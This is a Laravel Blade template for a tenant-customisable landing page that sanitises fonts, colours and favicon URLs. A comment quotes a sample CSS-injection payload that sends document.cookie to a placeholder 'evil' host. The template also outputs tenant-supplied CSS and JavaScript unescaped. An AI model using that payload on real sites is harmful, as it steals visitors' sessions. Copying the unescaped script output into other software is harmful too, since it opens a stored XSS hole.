<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ $page->title ?: $page->name }}</title>
@if($page->meta_description)
<meta name="description" content="{{ $page->meta_description }}">
@endif
@if($page->og_image_url)
<meta property="og:image" content="{{ $page->og_image_url }}">
@endif
@if($page->favicon_url && \App\Support\UrlSafety::isSafeExternalUrl($page->favicon_url))
{{-- Fix note: favicon_url is tenant-typed.  Blade {{ }} doesn't block
     javascript: scheme — gate the entire <link> behind UrlSafety. --}}
<link rel="icon" href="{{ $page->favicon_url }}">
@endif
<meta property="og:title" content="{{ $page->title ?: $page->name }}">
@if($page->meta_description)
<meta property="og:description" content="{{ $page->meta_description }}">
@endif
@php
    // CSS-context defense:
    //   font-family: tenant Select::make — but Livewire client validation
    //   is bypass-able. Server-side allowlist enforcement here ensures
    //   the rendered CSS is safe even if a malicious request stored an
    //   arbitrary $page->font_family.
    //   --primary / --bg: ColorSafety::safeHex rejects CSS-injection
    //   payloads like `red; }; body{background:url(//evil/?'+document.cookie+');`.
    $allowedFonts = ['Inter', 'System', 'Roboto', 'Open Sans', 'Lato', 'Poppins', 'Montserrat', 'Nunito'];
    $fontFamily = in_array($page->font_family, $allowedFonts, true) ? $page->font_family : 'Inter';
    $isInter   = $fontFamily === 'Inter';
    $fontStack = $fontFamily === 'System'
        ? '-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif'
        : "'{$fontFamily}',sans-serif";
    $safePrimaryColor = \App\Support\ColorSafety::safeHex($page->primary_color, '#4f46e5');
    $safeBgColor      = \App\Support\ColorSafety::safeHex($page->background_color, '#ffffff');
@endphp
{{-- Inter is self-hosted under public/vendor/ (no CDN).  Other font
     names selected by the tenant (Roboto / Open Sans / Lato / Poppins)
     gracefully fall back to the system sans-serif stack — buyers who
     want those fonts can self-host them and extend this template. --}}
@if($isInter)
<link rel="stylesheet" href="{{ asset('vendor/fonts/inter/inter.css') }}">
@endif
<style>
    :root{
        --primary:{{ $safePrimaryColor }};
        --bg:{{ $safeBgColor }};
    }
    *{box-sizing:border-box}
    html,body{margin:0;padding:0}
    body{font-family:{!! $fontStack !!};background:var(--bg);color:#0f172a;line-height:1.55;-webkit-font-smoothing:antialiased}
    img{max-width:100%;height:auto;display:block}
    a{color:var(--primary);text-decoration:none}
    .lp-wrap{max-width:1120px;margin:0 auto;padding:0 24px}
    .lp-btn{display:inline-block;background:var(--primary);color:#fff;padding:12px 24px;border-radius:10px;font-weight:600;font-size:15px;border:0;cursor:pointer;transition:transform .15s ease,box-shadow .15s ease}
    .lp-btn:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(79,70,229,.25)}
    .lp-btn-ghost{display:inline-block;background:transparent;color:var(--primary);border:1px solid var(--primary);padding:11px 23px;border-radius:10px;font-weight:600;font-size:15px}
    .lp-section{padding:72px 0}
    .lp-section h2{font-size:32px;font-weight:800;margin:0 0 12px;color:#0f172a;letter-spacing:-.01em}
    .lp-section p.lp-sub{color:#6b7280;font-size:17px;margin:0 0 40px}
    .lp-center{text-align:center}
    @media(max-width:720px){
        .lp-section{padding:56px 0}
        .lp-section h2{font-size:26px}
    }
</style>
@if($page->custom_css)
<style>{!! $page->custom_css !!}</style>
@endif
{{-- Static rules for this view (success-flash banner) live in the
     per-view stylesheet.  The inline <style> block above stays
     because it carries per-tenant CSS vars and editor-provided CSS. --}}
<link rel="stylesheet" href="{{ asset('css/views/public/landing/show.css') }}">
</head>
<body>

@if(session('landing_success'))
<div class="pls-flash-success">
    {{ __('marketing.public_landing_success_flash') }}
</div>
@endif

@foreach($sections as $section)
    @php
        $viewName = 'public.landing.sections.' . $section->type;
    @endphp
    @if(view()->exists($viewName))
        @include($viewName, ['content' => $section->content ?? [], 'page' => $page])
    @endif
@endforeach

{{-- Shared helper for <img data-hide-on-error> — used by the testimonials
     section to declaratively hide broken avatars (replaces an inline
     onerror= handler that is not allowed under CodeCanyon's Item 2). --}}
<script src="{{ asset('js/views/shared/hide-on-error.js') }}" defer></script>
@if($page->custom_js)
<script>{!! $page->custom_js !!}</script>
@endif
</body>
</html>
